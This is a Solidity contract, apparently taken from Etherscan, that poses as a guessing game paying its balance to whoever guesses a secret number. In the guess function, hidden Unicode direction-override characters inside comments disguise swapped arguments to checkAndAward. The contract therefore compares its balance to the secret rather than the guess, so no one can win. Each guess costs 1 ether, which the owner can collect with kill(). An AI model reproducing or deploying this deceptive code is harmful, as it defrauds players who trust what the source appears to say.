/**
 *Submitted for verification at Etherscan.io on 2022-09-12
*/

pragma solidity ^0.6.0;

contract GuessingGame
{
    uint _secret;
    address payable _owner;
    event success(string);
    event wrongNumber(string);
    
    constructor(uint secret) payable public
    {
        require(msg.value >= 1 ether);
        require(secret <= 10000);

        _secret = secret;
        _owner = msg.sender;
    }
    
    function getValue() view public returns (uint)
    {
        return address(this).balance;
    }

    function guess(uint n) payable public
    {
        require(msg.value == 1 ether);
        
        uint p = address(this).balance;
        checkAndAward(/*The prize‮/*rebmun desseug*/n , p/*‭
                /*The user who should benefit */,msg.sender);
    }
    
    function checkAndAward(uint p, uint n, address payable guesser) internal returns(bool)
    {
        if(n == _secret)
        {
            guesser.transfer(p);
            emit success("You guessed the correct number!");
        }
        else
        {
            emit wrongNumber("You've made an incorrect guess!");
        }
    }
    
    function kill() public
    {
        require(msg.sender == _owner);
        selfdestruct(_owner);
    }
}